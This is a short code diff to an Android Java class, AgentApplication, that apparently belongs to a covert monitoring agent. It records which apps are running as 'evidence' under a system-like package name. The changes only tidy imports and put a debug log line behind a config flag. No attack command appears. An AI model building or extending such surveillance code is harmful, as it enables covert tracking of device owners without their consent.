@@ -10,10 +10,6 @@
 package com.android.service.agent;
 
 import java.util.ArrayList;
-import java.util.HashSet;
-import java.util.Iterator;
-import java.util.Set;
-import java.util.TreeMap;
 
 import android.app.ActivityManager.RunningAppProcessInfo;
 import android.util.Log;
@@ -21,7 +17,7 @@ import android.util.Log;
 import com.android.service.LogR;
 import com.android.service.ProcessInfo;
 import com.android.service.ProcessStatus;
-import com.android.service.RunningProcesses;
+import com.android.service.auto.Cfg;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
@@ -78,7 +74,7 @@ public class AgentApplication extends AgentBase implements Observer<ProcessInfo>
 		log.write(items);
 		log.close();
 		
-		Log.d("QZ", TAG + " (saveEvidence): " + name + " " + status.name());
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " (saveEvidence): " + name + " " + status.name());
 	}
 
 }
